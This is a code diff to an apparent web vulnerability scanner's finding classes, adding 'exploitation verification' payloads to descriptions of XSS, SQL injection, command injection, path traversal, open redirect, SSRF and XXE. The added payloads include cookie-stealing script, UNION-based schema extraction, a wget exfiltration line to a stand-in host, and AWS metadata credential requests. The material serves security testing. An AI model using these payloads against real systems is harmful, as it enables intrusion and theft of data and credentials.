@@ -10,7 +10,10 @@ export class ReflectedXss extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-01']; }
     static description() {
-        return 'Cross-site scripting (XSS) allows code injecton by malicious users into web pages viewed by other users. Examples include HTML code and client-side scripts.';
+        return 'Cross-site scripting (XSS) allows code injecton by malicious users into web pages viewed by other users. Examples include HTML code and client-side scripts.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. Try <code>"&gt;&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> to confirm the origin context.<br>' +
+            '2. Try <code>"&gt;&lt;img src=x onerror=prompt(document.cookie)&gt;</code> to test cookie access.';
     }
     static solution() {
         return 'Validate all headers, cookies, query strings, form fields. Encode user suplied output on the server side.';
@@ -85,7 +88,11 @@ export class SqlInjection extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-05']; }
     static description() {
-        return 'SQL injection lets an atacker alter queries executed on the backend databse. May allow data extracton or privilege escaltion.';
+        return 'SQL injection lets an atacker alter queries executed on the backend databse. May allow data extracton or privilege escaltion.<br><br>' +
+            '<b>Exploitation Extration:</b><br>' +
+            '1. Try <code>ORDER BY 10--</code> to find logical column count.<br>' +
+            '2. Try <code>UNION SELECT 1,database(),table_name,4 FROM information_schema.tables--</code> to extract schemas.<br>' +
+            '3. Sqlmap via: <code>sqlmap -u "&lt;url&gt;" -p &lt;param&gt; --dbs</code>';
     }
     static solution() {
         return 'Use paramterized statements. Never embed user input directly in SQL.';
@@ -122,7 +129,11 @@ export class CommandExecution extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-12']; }
     static description() {
-        return 'OS command injection allows an atacker to execute arbitrary comands on the host operting system.';
+        return 'OS command injection allows an atacker to execute arbitrary comands on the host operting system.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. Try injecting sleep delays: <code>;sleep 10;</code> or <code>| ping -c 10 127.0.0.1</code><br>' +
+            '2. Try extracting user identities: <code>;id</code> or <code>`whoami`</code><br>' +
+            '3. Out-of-band extraction: <code>;wget http://your-server.com/?data=$(whoami)</code>';
     }
     static solution() {
         return 'Avoid calling OS comands with user suplied input. Use paramterized APIs instead.';
@@ -179,7 +190,11 @@ export class FileInclusion extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-11']; }
     static description() {
-        return 'Path traversal or file inclusion allows an atacker to access files outside the intended directry.';
+        return 'Path traversal or file inclusion allows an atacker to access files outside the intended directry.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. For Linux targets try reading root system files: <code>../../../../../../etc/passwd</code><br>' +
+            '2. For Windows targets try: <code>..\\..\\..\\..\\..\\Windows\\win.ini</code><br>' +
+            '3. Check for PHP wrappers (LFI to RCE): <code>php://filter/convert.base64-encode/resource=index.php</code>';
     }
     static solution() {
         return 'Validate file paths and use a whitelist of allowd files.';
@@ -250,7 +265,11 @@ export class OpenRedirect extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-CLNT-04']; }
     static description() {
-        return 'Open redirect allows an atacker to redirect users to malicous websites.';
+        return 'Open redirect allows an atacker to redirect users to malicous websites.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. Try redirecting to external sites: <code>https://evil.com</code> or <code>//evil.com</code><br>' +
+            '2. Try Javascript scheme for XSS: <code>javascript:prompt(document.cookie)</code><br>' +
+            '3. Try bypassing domain filters: <code>https://expected-domain.com.evil.com</code>';
     }
     static solution() {
         return 'Validate redirect URLs against a whitelist of allowd destinations.';
@@ -268,7 +287,11 @@ export class Ssrf extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-19']; }
     static description() {
-        return 'SSRF allows an atacker to make the server send requests to unintendded locations.';
+        return 'SSRF allows an atacker to make the server send requests to unintendded locations.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. Try interacting with local services: <code>http://127.0.0.1:22</code> or <code>http://localhost:6379</code><br>' +
+            '2. Try reading AWS Cloud metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br>' +
+            '3. Try using alternate schemes: <code>file:///etc/passwd</code> or <code>dict://localhost:11211/stat</code>';
     }
     static solution() {
         return 'Validate and sanitize user-suplied URLs. Use allowlists for outgoing conections.';
@@ -495,7 +518,10 @@ export class XxeFinding extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-07']; }
     static description() {
-        return 'XXE allows an atacker to interfere with XML procesing, potentialy reading local files or making server requests.';
+        return 'XXE allows an atacker to interfere with XML procesing, potentialy reading local files or making server requests.<br><br>' +
+            '<b>Exploitation Verification:</b><br>' +
+            '1. Inject external entity for LFI:<br><code>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code><br>' +
+            '2. Inject external entity for SSRF: <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code>';
     }
     static solution() {
         return 'Disable external entiy procesing in the XML parser.';
